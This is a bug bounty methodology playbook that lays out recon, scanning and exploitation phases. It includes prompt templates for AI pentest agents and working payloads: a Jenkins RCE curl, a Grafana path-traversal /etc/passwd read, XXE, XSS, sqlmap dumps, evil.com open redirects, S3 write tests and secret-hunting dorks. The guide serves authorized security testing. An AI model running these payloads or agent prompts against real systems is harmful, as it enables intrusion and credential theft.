# PLAYBOOK: Bug Bounty — Full Recon Pipeline
# April 2026 Red Team Stack
# Built for HackerOne, Bugcrowd, Intigriti, Synack programs

---

## Program Onboarding

Before touching anything:
```bash
# 1. Read the full program scope — note every in-scope domain/IP
# 2. Note exclusions — third-party, out-of-scope subdomains, rate limits
# 3. Check for known duplicates on the platform
# 4. Set up mission
./scripts/new-mission.sh [company-name] [main-domain] bugbounty
```

---

## PHASE 1 — PASSIVE RECON (Zero Noise)

**No active scanning yet — passive only.**

```
I am an authorized bug bounty hunter on the [PROGRAM_NAME] program.
In-scope domain: [TARGET_DOMAIN]. Program: [URL].

Using hexstrike-ai, run full passive recon — no active scanning yet:
1. Certificate transparency: crt.sh + censys lookups for all subdomains
2. DNS history: SecurityTrails, Shodan, FOFA passive lookup
3. Wayback Machine: waybackurls + gau — get all historical URLs
4. GitHub dorking: search for [company] API keys, secrets, config files
5. Google dorks: site:[domain] filetype:env OR filetype:sql OR filetype:log
6. Shodan/Censys: scan for exposed assets (non-invasive API query only)

Save all to loot/[MISSION]/recon/passive/
```

**GitHub dorking manually:**
```
# Search GitHub for leaked secrets
site:github.com "[company]" password OR api_key OR secret OR token
site:github.com "[company.com]" filename:.env
site:github.com "[company]" "-----BEGIN RSA PRIVATE KEY-----"
```

---

## PHASE 2 — SUBDOMAIN ENUMERATION

```
Using hexstrike-ai BugBounty Agent, enumerate all subdomains of [TARGET_DOMAIN]:

1. Active enumeration (DNS brute-force):
   - subfinder (passive APIs)
   - amass enum -passive (OSINT APIs)
   - dnsx (resolve and validate all found)

2. Permutation-based:
   - dnsgen on found subdomains
   - altdns with common permutations

3. Port scan all resolved subdomains:
   - httpx probe: 80, 443, 8080, 8443, 8888, 3000, 5000
   - Output: live hosts with status codes, titles, tech

Save deduplicated resolved list to loot/[MISSION]/recon/subdomains.txt
Save live web hosts to loot/[MISSION]/recon/live_hosts.txt
```

**Expected output structure:**
```
loot/[MISSION]/recon/
├── subdomains_raw.txt       # All discovered (unresolved)
├── subdomains_resolved.txt  # DNS-validated only
├── live_hosts.txt           # HTTP/HTTPS responding
├── live_hosts_full.json     # httpx JSON with status, title, tech, tls
└── interesting.txt          # Manually flagged interesting hosts
```

---

## PHASE 3 — FINGERPRINTING & PRIORITIZATION

```
Using hexstrike-ai, fingerprint all live hosts:
1. whatweb + wappalyzer for tech stack
2. httpx headers analysis (look for debug headers, server versions)
3. Categorize by:
   - Interesting tech (Jenkins, Grafana, Kibana, Jupyter, Strapi, etc.)
   - Admin panels (/admin, /console, /manager, /dashboard)
   - APIs (Swagger/OpenAPI docs, GraphQL endpoints)
   - Old/deprecated apps (ancient versions = more vulns)
   - Development/staging servers (dev., staging., test., qa.)
```

**Manually review:**
- Any `.dev`, `.staging`, `.test`, `.internal` subdomains
- Services on non-standard ports
- AWS S3 buckets, Azure blobs (check for public access)
- Old apps with version numbers in responses

---

## PHASE 4 — HIGH-VALUE TARGET SCANNING

Attack the most promising targets first — don't scan everything.

**Priority 1 — Developer tools exposed:**
```
# Jenkins, Grafana, Kibana, Jupyter, Portainer, etc.
# Check for unauthenticated access or default creds

Using Kali MCP:
# Jenkins script console RCE check
curl -s http://[JENKINS_URL]/script -d 'script=println("id".execute().text)'

# Grafana CVE-2021-43798 path traversal
curl --path-as-is http://[GRAFANA]/public/plugins/alertlist/../../../../../../../etc/passwd
```

**Priority 2 — APIs:**
```
Using hexstrike-ai:
1. Find all API endpoints: gau + waybackurls + JS link extraction
2. ffuf on /api/v1/, /api/v2/, /graphql, /rest/
3. Arjun parameter discovery on discovered endpoints
4. Test for IDOR: change IDs in requests (1→2, uuid swaps)
5. Test for mass assignment: add extra fields to POST requests
6. GraphQL introspection: check if enabled
```

**Priority 3 — Authentication:**
```
Test all login pages for:
- Default credentials (admin:admin, test:test, [company]:[company])
- Password reset token predictability
- Username enumeration (different error messages)
- Rate limiting absence (try 100 passwords without lockout)
- OAuth misconfigurations (redirect_uri validation)
- JWT vulnerabilities (alg:none, weak secret)
```

---

## PHASE 5 — TARGETED VULNERABILITY TESTING

### Full Nuclei Scan (Top Targets Only)
```
Using hexstrike-ai, run nuclei against [LIVE_HOSTS_LIST]:
- Template tags: critical,high,cve
- Rate limit: 50 req/sec (check program rules for rate limits)
- Skip: DOS, fuzzing templates (too noisy for bug bounty)
```

### Manual OWASP Testing
```
For each high-value target, test manually via Kali MCP:

SQLi:
  sqlmap -u "[URL_WITH_PARAM]" --batch --level=3 --risk=2 --dbs

XSS:
  dalfox url "[URL]" --silence
  # Manual: try <script>alert(document.domain)</script> in every input

SSRF:
  # Set up Burp Collaborator or interactsh first
  kali_exec("interactsh-client -v &")
  # Then test: http://[COLLABORATOR_URL] in URL parameters, headers, body

XXE:
  # Test XML endpoints with:
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

Open Redirect:
  # Test redirect parameters with:
  ?redirect=https://evil.com
  ?next=//evil.com
  ?url=javascript:alert(1)
```

---

## PHASE 6 — SUBDOMAIN TAKEOVER CHECK

High-value, often overlooked.

```
Using hexstrike-ai OSINT tools:
1. Run subjack against all subdomains:
   subjack -w subdomains_resolved.txt -t 100 -timeout 30 -o takeovers.txt -v

2. Check CNAMEs pointing to:
   - Unclaimed GitHub Pages (github.io)
   - Unclaimed Heroku apps (herokuapp.com)
   - Unclaimed S3 buckets
   - Fastly, Pantheon, Shopify, Squarespace orphaned configs

3. For each potential takeover: verify by attempting to claim the resource
```

---

## PHASE 7 — CLOUD & S3 RECON

```
Using hexstrike-ai Cloud tools:
1. S3 bucket discovery: s3scanner + bucket brute from company name
   - [company], [company]-assets, [company]-backup, [company]-dev
   - [company]-prod, [company]-staging, [company]-data

2. For each bucket found:
   - Check public read: aws s3 ls s3://[BUCKET] --no-sign-request
   - Check public write: aws s3 cp /tmp/test.txt s3://[BUCKET]/ --no-sign-request

3. Azure blobs: search for [company].blob.core.windows.net
4. GCP buckets: storage.googleapis.com/[company]-*
```

---

## PHASE 8 — REPORTING

### Write a Strong Report

**Critical elements for maximum payout:**
```
Title: [Clear, specific vulnerability description]
e.g., "IDOR in /api/v2/users/{id} allows full account takeover"

NOT: "IDOR vulnerability found"

Severity: Base it on actual impact + CVSS
- Critical: Full account takeover, RCE, SQLi with data dump, PII exposure
- High: Privilege escalation, stored XSS, SSRF with internal access
- Medium: Reflected XSS, CSRF with impact, info disclosure of sensitive data
- Low: Self-XSS, missing headers, verbose errors

Steps to Reproduce: EXACT steps, copy-paste ready
1. Go to URL: https://...
2. Set header: Authorization: Bearer [JWT]
3. Send request: [EXACT HTTP REQUEST]
4. Observe response: [EXACT RESPONSE SHOWING VULN]

Impact: Be specific — what can an attacker DO?
"An unauthenticated attacker can enumerate all user accounts by 
 iterating the id parameter, exposing email addresses, full names,
 and account balances of all 2.3M registered users."

PoC: Working demo — video or screenshots of exploitation
```

---

## Bug Bounty Quick Wins Checklist

```
[ ] robots.txt and sitemap.xml → find hidden paths
[ ] .git/ exposed → clone entire codebase
[ ] .env exposed → API keys, DB creds
[ ] /swagger-ui or /api-docs → full API map
[ ] Default creds on admin panels
[ ] GraphQL introspection enabled
[ ] JWT with alg:none or weak HS256 secret
[ ] Password reset with predictable tokens
[ ] S3 bucket public write
[ ] CORS misconfiguration (Origin: evil.com reflected)
[ ] Host header injection → password reset poisoning
[ ] Blind XSS in admin/support ticket fields
[ ] Mass assignment on registration/update endpoints
[ ] IDOR on IDs (increment by 1, try UUID from another account)
[ ] Open redirect → OAuth token theft
[ ] SSRF via URL parameters, webhooks, PDF generators
[ ] Subdomain takeover (check all CNAME targets)
[ ] HTTP request smuggling (CL.TE / TE.CL)
```

---

*April 2026 | Bug bounty — authorized disclosure only*
